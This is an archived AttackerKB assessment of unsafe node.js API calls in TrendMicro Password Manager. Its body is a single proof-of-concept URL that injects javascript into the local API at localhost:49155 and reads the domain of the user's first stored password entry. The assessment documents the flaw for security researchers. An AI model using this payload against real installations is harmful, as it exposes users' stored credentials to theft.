---
title: TrendMicro Password Manager node.js Unsafe API Calls
author: wchen-r7
score: 0
topic_attacker_value: 0
topic_exploitability: 0
created: '2019-09-12T18:07:44.699668'
revision_date: '2020-02-13T17:12:11.433448'
assessment_id: d6e11fdf-acde-4b8e-8d73-ab520e4fb7dc
topic_id: 1d018435-a9c7-4316-b5a2-3d807278b1d4
topic_short_id: snxaXXrwFx
topic_slug: trendmicro-password-manager-node-js-unsafe-api-calls
akb_topic_url: https://attackerkb.com/topics/snxaXXrwFx/trendmicro-password-manager-node-js-unsafe-api-calls
akb_assessment_url: https://attackerkb.com/topics/snxaXXrwFx/trendmicro-password-manager-node-js-unsafe-api-calls#d6e11fdf-acde-4b8e-8d73-ab520e4fb7dc
---

# TrendMicro Password Manager node.js Unsafe API Calls

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/snxaXXrwFx/trendmicro-password-manager-node-js-unsafe-api-calls#d6e11fdf-acde-4b8e-8d73-ab520e4fb7dc).*

---

This example will show the domain of the first encrypted password:

```
https://localhost:49155/api/showSB?url=javascript:topWindow.process.mainModule.exports.Tower.handle.getUserData(function(n){alert(JSON.parse(n).data.passcard[0].Domain)})'
```
